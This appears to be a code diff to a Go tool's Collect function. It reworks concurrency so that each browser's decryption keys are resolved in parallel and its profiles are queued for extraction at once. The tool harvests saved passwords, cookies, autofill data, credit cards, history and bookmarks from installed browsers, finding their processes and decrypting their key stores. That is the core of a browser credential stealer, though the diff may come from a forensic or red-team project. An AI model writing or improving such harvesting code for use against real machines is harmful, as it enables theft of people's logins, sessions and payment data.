@@ -56,59 +56,6 @@ func Collect(ctx context.Context, opts types.CollectOptions, partialFn func(*typ
 	needsBrowserData := opts.Passwords || opts.Cookies || opts.Autofill ||
 		opts.History || opts.Bookmarks || opts.CreditCards
 
-	type browserState struct {
-		cfg      types.BrowserConfig
-		keys     *types.ResolvedKeys
-		profiles []types.ProfileInfo
-		pids     []uint32
-	}
-
-	var states []browserState
-	if needsBrowserData {
-		type keyItem struct {
-			cfg      types.BrowserConfig
-			profiles []types.ProfileInfo
-		}
-		var items []keyItem
-		for _, cfg := range browser.Browsers {
-			if profiles := browser.FindProfileDirs(cfg); len(profiles) > 0 {
-				items = append(items, keyItem{cfg, profiles})
-			}
-		}
-
-		const keyWorkers = 3
-		sem := make(chan struct{}, keyWorkers)
-		states = make([]browserState, len(items))
-		errs := make([]string, len(items))
-		var keyWg sync.WaitGroup
-		for i, it := range items {
-			keyWg.Add(1)
-			go func(i int, it keyItem) {
-				defer keyWg.Done()
-				sem <- struct{}{}
-				defer func() { <-sem }()
-
-				logf("resolving keys for %s (%d profiles)", it.cfg.Name, len(it.profiles))
-				keys, err := crypto.ResolveKeys(it.cfg)
-				if err != nil {
-					logf("%s key resolution failed: %v", it.cfg.Name, err)
-					keys = &types.ResolvedKeys{}
-					errs[i] = fmt.Sprintf("%s key resolution: %v", it.cfg.Name, err)
-				}
-				pids, _ := platform.FindProcesses(it.cfg.ProcessName)
-				states[i] = browserState{it.cfg, keys, it.profiles, pids}
-			}(i, it)
-		}
-		keyWg.Wait()
-		mu.Lock()
-		for _, e := range errs {
-			if e != "" {
-				result.Errors = append(result.Errors, e)
-			}
-		}
-		mu.Unlock()
-	}
-
 	type job struct {
 		cfg     types.BrowserConfig
 		keys    *types.ResolvedKeys
@@ -118,6 +65,9 @@ func Collect(ctx context.Context, opts types.CollectOptions, partialFn func(*typ
 
 	jobCh := make(chan job, 64)
 
+	// Launch extraction workers up front so they can consume jobs as soon as
+	// each browser's keys resolve, instead of waiting for every browser's key
+	// resolution (and its headless spawn) to finish first.
 	const workers = 4
 	for i := 0; i < workers; i++ {
 		wg.Add(1)
@@ -146,19 +96,50 @@ func Collect(ctx context.Context, opts types.CollectOptions, partialFn func(*typ
 		}()
 	}
 
-	go func() {
-		defer close(jobCh)
-		for _, s := range states {
-			for _, p := range s.profiles {
-				select {
-				case jobCh <- job{s.cfg, s.keys, p, s.pids}:
-				case <-ctx.Done():
-					logf("collection deadline reached; stopping job producer")
-					return
-				}
+	if needsBrowserData {
+		const keyWorkers = 3
+		sem := make(chan struct{}, keyWorkers)
+		var keyWg sync.WaitGroup
+		for _, cfg := range browser.Browsers {
+			profiles := browser.FindProfileDirs(cfg)
+			if len(profiles) == 0 {
+				continue
 			}
+			keyWg.Add(1)
+			go func(cfg types.BrowserConfig, profiles []types.ProfileInfo) {
+				defer keyWg.Done()
+				sem <- struct{}{}
+				defer func() { <-sem }()
+
+				logf("resolving keys for %s (%d profiles)", cfg.Name, len(profiles))
+				keys, err := crypto.ResolveKeys(cfg)
+				if err != nil {
+					logf("%s key resolution failed: %v", cfg.Name, err)
+					keys = &types.ResolvedKeys{}
+					mu.Lock()
+					result.Errors = append(result.Errors, fmt.Sprintf("%s key resolution: %v", cfg.Name, err))
+					mu.Unlock()
+				}
+				pids, _ := platform.FindProcesses(cfg.ProcessName)
+
+				for _, p := range profiles {
+					select {
+					case jobCh <- job{cfg, keys, p, pids}:
+					case <-ctx.Done():
+						logf("collection deadline reached; stopping job producer for %s", cfg.Name)
+						return
+					}
+				}
+			}(cfg, profiles)
 		}
-	}()
+
+		go func() {
+			keyWg.Wait()
+			close(jobCh)
+		}()
+	} else {
+		close(jobCh)
+	}
 
 	wg.Wait()
 
